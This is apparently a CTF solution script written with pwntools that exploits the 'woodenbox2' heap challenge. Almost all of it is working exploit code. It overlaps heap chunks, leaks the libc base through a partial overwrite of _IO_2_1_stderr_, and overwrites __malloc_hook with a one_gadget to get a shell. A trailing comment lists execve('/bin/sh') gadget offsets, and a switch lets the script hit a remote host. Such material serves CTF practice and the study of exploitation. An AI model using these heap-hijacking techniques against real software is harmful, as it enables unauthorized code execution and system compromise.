#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "./woodenbox2"
#libFile  = "./libc.so.6"
libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sla('Your choice:', str(1))
	sla('name:', str(size))
	sa('item:', text)

def md(idx, size, text):
	sla('Your choice:', str(2))
	sla('item:', str(idx))
	sla('name:', str(size))
	sa('item:', text)

def rm(idx):
	sla('Your choice:', str(3))
	sla('item:', str(idx))

def q():
	sla('Your choice:', str(4))

#--------------------------Exploit--------------------------
def exploit():

	# notice: free() then idx forword 1
	ad(0x68, '0' * 0x68) # c0 i0
	ad(0x68, '1' * 0x68) # c1 i1
	ad(0x68, '2' * 0x68) # c2 i2
	ad(0x68, '3' * 0x68) # c3 i3

	md(0, 0x70, '0' * 0x68 + p64(0xe1))
	rm(1)
	rm(1) # chunk 2

	#split chunk 1 as two, then main_arena to chunk 2
	ad(0x38, '6' * 0x38) # c4 i3 in chunk 1
	ad(0x28, '6' * 0x28) # c5 i4 in chunk 1

	# leaking
	# _IO_2_1_stderr_+157 for fastbin attack
	md(2, 0x32, '5' * 0x28 + p64(0x71) + '\xdd\x25') # c5
	ad(0x68, '\x00' * 0x68) # for ajust
	#                            0xfbad1800
	ad(0x68, '\x00' * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0))
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base -= lib.sym['_IO_2_1_stderr_'] + 192
	lib.address = libc_base
	li('libc_base ' + hex(libc_base)) 
	__malloc_hook = lib.sym['__malloc_hook']
	realloc = lib.sym['realloc']
	li('__malloc_hook ' + hex(__malloc_hook)) 
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]

	#md(3, 4, 'AAAA')
	rm(3) #rm chunk 2
	md(1, 0x38, '5' * 0x28 + p64(0x71) + p64(__malloc_hook - 0x23))
	ad(0x68, '\n')
	ad(0x68, '\x00' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc))

	#get shell
	sl('1')
	sl('1')

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL

'''
